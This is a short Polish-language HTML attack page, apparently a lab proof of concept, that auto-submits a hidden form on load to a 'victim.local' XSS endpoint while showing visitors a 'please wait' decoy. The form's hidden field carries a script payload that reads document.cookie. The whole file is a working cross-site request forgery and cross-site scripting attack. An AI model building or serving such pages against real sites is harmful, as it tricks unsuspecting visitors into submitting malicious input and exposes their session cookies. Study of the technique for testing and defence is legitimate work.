<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <title>Strona atakująca</title>
    <script>
        // Automatyczne wysłanie formularza po załadowaniu strony
        window.onload = function() {
            document.forms["attackForm"].submit();
        };
    </script>
</head>
<body>
    <h1>Proszę czekać, trwa przetwarzanie...</h1>

    <form id="attackForm" action="http://victim.local/xss.php" method="POST">
        <!-- Złośliwy skrypt XSS w nowym haśle -->
        <input type="hidden" name="message" value="<script>alert(document.cookie);</script>">
    </form>
</body>
</html>